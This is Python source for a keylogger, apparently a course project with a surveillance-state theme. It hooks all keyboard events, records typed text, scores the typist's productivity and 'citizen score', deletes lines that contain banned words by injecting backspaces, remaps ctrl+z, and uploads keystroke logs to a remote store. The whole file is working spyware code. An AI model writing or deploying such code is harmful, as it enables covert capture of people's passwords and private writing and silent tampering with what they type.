from typing import List
import keyboard
import time
from difflib import SequenceMatcher

"""
AUTHOR: PHILIPP WENDEL
"""

"""
Keylogger, Ideas and shortcomings listed by Prof. Kruse were tried to be heard
"""

"""
SHIFT_PUNCTUATION is a key literal list containing every shift + key combination
"""
SHIFT_PUNCTUATION = ['!', '"', '§', '$', '%', '&', '/', '(', ')', '=', '?', ';', ':', '_', '`', '*', '\'']

"""
Checks if a string contains a substring, if it containes returnes true, else returns false
"""
def contains(line: str, sub: str):
    if line.find(sub) >= 0:
        return True
    return False

"""
Calculate the words per minute of a list of strings
"""
def wpm(lines: List[str], recordingEnd, recordingStart):
    words = []
    for line in lines:
        words.extend(line.split(" "))
    words = list(filter(None, words))
    wordsPerMinute = len(words) / ((recordingEnd - recordingStart) / 60)
    return wordsPerMinute

"""
By using the 'Gestalt pattern recognition' evaluates if two strings are near-equal to each other.
Example: 'apple' and 'appel' have a ration of above 0.80
"""
def similar(a: str, b: str):
    return SequenceMatcher(None, a, b).ratio() > 0.75

"""
This sub-section the keylogger script contains helper methods to navigate in a text
"""
def moveRight(len: int):
    for i in range(0, len):
        keyboard.press_and_release("right")

def moveLeft(len: int):
    for i in range(0, len):
        keyboard.press_and_release("left")

def moveUp(len: int):
    for i in range(0, len):
        keyboard.press_and_release("up")

def moveDown(len: int):
    for i in range(0, len):
        keyboard.press_and_release("down")

"""
Special method to move to the end of the line above the current one.
"""
def moveToUpperRightLineEnd():
    moveUp(1)
    keyboard.press_and_release("end")

"""
A Keylogger that records every key event (Key-Down and Key-Up) and evaluates the written strings.
It censors the users input by abbreviation and deleting such words containing lines completly.
The Keylogger also evaluates the keys usage of this user and their WPM to stipulate about the
citizen effectiveness and productiveness at a point in time.
"""
class KeyLogger():
    def __init__(self, queryController, unwantedStrings: List[str]):
        self.queryController = queryController
        self.unwantedStrings = unwantedStrings
        self.logged = []
        self.keyEvaluation = {}

    """
    Correct a word by deleting and then writing the corrected version. The Input-Cursor needs to be stationed at the end of the word
    """
    def correctWord(self, wrongWord: str, correctWord: str):
        self.deleteWord(wrongWord)
        self.write(correctWord+" ")
        return True

    """
    Self-Implemented method to write strings. Check if a letter is Uppercase or inside the SHIFT_PUNCTUATION list and play the necessary key events
    such as 'shift' and 'KEY'
    """
    def write(self, string: str):
        for c in string:
            if c.isupper() or c in SHIFT_PUNCTUATION:
                keyboard.press("shift")
                keyboard.press_and_release(f'{c.lower()}')
                keyboard.release("shift")
            else:
                keyboard.press_and_release(f'{c}')

    """
    Check if the users input containes any bad word or sentence, censoring the input by deleting the line.
    Effective censoring
    """
    def censorLines(self, lines: List[str]):
        censored = False
        counter = 0
        joinedLines = "".join(lines).upper()
        for badWord in self.unwantedStrings:
            if joinedLines.find(badWord.upper()) >= 0:
                censored = True
                counter = counter + 1
        try:
            words = []
            for line in lines:
                temp1 = [word.upper() for word in line.split()]
                for t in temp1:
                    words.append(t)
            setOfWords = set()
            for w in words:
                setOfWords.add(w)
            for _, word in enumerate(setOfWords):
                for badWord in self.unwantedStrings:
                    if similar(word.upper(), badWord.upper()):
                        counter = counter + 1
                        censored = True
        except:
            pass
        i = 0
        if censored:
            while i <= counter:
                i = i + 1
                self.queryController.updateSCS(-5)
            self.queryController.saveBadHabits(f'Buerger hat unerwuenschtes Gedankengut geschrieben!')
            for _ in range(0, len(joinedLines)):
                keyboard.press_and_release("backspace")

    """
    Evaluate a keys usage by counting the occurence of the character assigned to the key
    """
    def evaluateKeyUsage(self, stringList: List[str]):
        checked = []
        for str in stringList:
            for c in str:
                if c not in checked:
                    count = str.count(c)
                    self.keyEvaluation[c] = count
                    checked.append(c)
        return self.keyEvaluation

    """
    Deleting a word. Delete a word by pressing len(word) times 'backspace'
    """
    def deleteWord(self, word: str):
        length = len(word)
        for _ in range(0, length):
            keyboard.press_and_release("backspace")
        keyboard.press_and_release("delete")
        return True

    """
    Deleting a line. Delete a word by pressing len(line) times 'backspace'
    """
    def deleteLine(self, line: str):
        length = len(line)
        for _ in range(0, length+1):
            keyboard.press_and_release("backspace")

    """
    Check for specific word occurrences in a given string. Return the similar found words
    """
    def checkWordInSentence(self, sentence: str):
        words = sentence.split(" ")
        foundWords = []
        for word in words:
            for anitWord in self.censorWords:
                if similar(word, anitWord):
                    foundWords.append(word)
        return foundWords

    """
    Check for sentence similarity and return a list of such sentences
    """
    def checkSentences(self, lines: List[str]):
        foundSentences = []
        for line in lines:
            sentences = line.split(".")
            for sentence in sentences:
                for antiSentence in self.censorSentences:
                    if similar(sentence, antiSentence):
                        foundSentences.append(sentence)
        return foundSentences

    def addAbbreviations(self):
        for badString in self.unwantedStrings:
            keyboard.add_abbreviation(badString, "")

    """
    Main attraction of the Keylogger Class. Read the key input stream of the windows I/O hook.
    Evaluate the wpm, key usage and such. Deduct the written strings. Censor by abbreviation and
    deleting lines if input conataines non-allowed (sub-) strings
    """
    def readKeyEvents(self):
        while 1:
            startTime = time.time()
            lines = []
            lines.clear()
            keyEvents, keyEventsAll = self.readFirstNKeyEvents()
            writtenStrings = keyboard.get_typed_strings(keyEvents, allow_backspace=False)
            endTime = time.time()
            KPM = len(keyEventsAll)/(endTime-startTime)
            self.queryController.updateKPM(len(keyEventsAll), KPM)
            """ if KPM < 50:
                self.queryController.saveBadHabits(f'Unzureichende Produktivität festgestellt: {KPM}') """
            for string in writtenStrings:
                if contains(string, "konami"):
                    return 1
                lines.append(string)
            self.censorLines(lines)
            keyEvaluation = self.evaluateKeyUsage(lines)
            self.queryController.updateKeyEvaluation(keyEvaluation)
            WPM = wpm(lines, endTime, startTime)
            self.queryController.updateCurrentWPM(WPM)
            yield lines

    def readFirstNKeyEvents(self):
        keyEvents = []
        keyEventsAll = []
        checkTime = time.time()
        while time.time()-checkTime < 60:
            keyEvent = keyboard.read_event()
            keyEventsAll.append(keyEvent)
            checkTime = time.time()
            if len(keyEvents) >= 50 and keyEvent.name == "space":
                return keyEvents, keyEventsAll
            if keyEvent.name != "tab":
                keyEvents.append(keyEvent)
        return keyEvents, keyEventsAll

    """
    Initiating a generator object with the readKeyInput method. After a enter key is pressed,
    upload the deducted line to the firebase data storage solution
    """
    def main(self):
        self.addAbbreviations()
        keyboard.remap_hotkey("ctrl+z", " ")
        callback = lambda: self.queryController.updateSCS(-5)
        keyboard.add_hotkey("ctrl+z", callback)
        log = []
        counter = 0
        for lines in self.readKeyEvents():
            for line in lines:
                if len(line) > 0:
                    log.append(line)
                if counter > 5:
                    if self.queryController is not None:
                        self.queryController.addToKeyLogs(log)
                        counter = 0
                        log.clear()
                counter = counter + 1